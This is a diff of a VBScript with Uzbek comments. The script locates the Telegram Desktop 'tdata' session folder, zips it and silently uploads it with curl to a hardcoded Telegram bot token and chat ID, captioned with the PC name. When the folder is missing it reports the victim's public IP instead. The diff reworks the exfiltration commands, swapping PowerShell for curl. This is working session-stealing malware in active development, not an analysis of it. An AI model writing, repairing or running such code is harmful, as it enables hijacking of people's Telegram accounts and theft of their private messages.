@@ -1,12 +1,14 @@
 Set WshShell = CreateObject("WScript.Shell")
 Set FSO = CreateObject("Scripting.FileSystemObject")
 
+' Telegram ma'lumotlari
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = "7080045924"
 
 Set WshNetwork = CreateObject("WScript.Network")
 PCName = WshNetwork.ComputerName
 
+' tdata papkasini qidirish
 AppData = WshShell.ExpandEnvironmentStrings("%APPDATA%")
 TDataPath = AppData & "\TelegramDesktop\tdata"
 
@@ -19,16 +21,18 @@ If FSO.FolderExists(TDataPath) Then
     Set objFolder = objShell.NameSpace(TDataPath)
     Set objZip = objShell.NameSpace(ZipPath)
 
+    ' ZIP siqish
     On Error Resume Next
     objZip.CopyHere objFolder.Items, 16
     On Error GoTo 0
 
-    ' ZIP siqilishi uchun vaqt
-    WScript.Sleep 3000
+    ' Siqilishi uchun 5 soniya kutish (katta fayllar uchun)
+    WScript.Sleep 5000
 
-    ' ✅ Telegramga fayl yuborish (BU YERGA TUZATILGAN KOD QO'YILDI)
-    WshShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendDocument' -Method Post -ContentType 'multipart/form-data' -Form @{chat_id='" & CHAT_ID & "'; document=@'" & ZipPath & "' ; caption='✅ tdata yigildi! PC: " & PCName & "'}""", 0, True
+    ' Telegramga fayl yuborish (BU SAFAR CURL ISHLATILADI!)
+    WshShell.Run "cmd /c curl -s -F chat_id=" & CHAT_ID & " -F document=@" & ZipPath & " -F caption='✅ tdata yigildi! " & PCName & "' https://api.telegram.org/bot" & BOT_TOKEN & "/sendDocument", 0, True
 
+    ' ZIP faylni o'chirish
     FSO.DeleteFile(ZipPath)
 Else
     Set http = CreateObject("MSXML2.ServerXMLHTTP")
@@ -36,6 +40,5 @@ Else
     http.send
     ip = http.responseText
 
-    ' Agar tdata topilmasa
-    WshShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage' -Method Post -ContentType 'application/json' -Body '{\""chat_id\"":" & CHAT_ID & ", \""text\"": \""⚠️ tdata topilmadi! PC: " & PCName & ", IP: " & ip & "\""}'""", 0, True
+    WshShell.Run "cmd /c curl -s -d chat_id=" & CHAT_ID & " -d text='⚠️ tdata topilmadi! " & PCName & ", IP: " & ip & "' https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage", 0, True
 End If
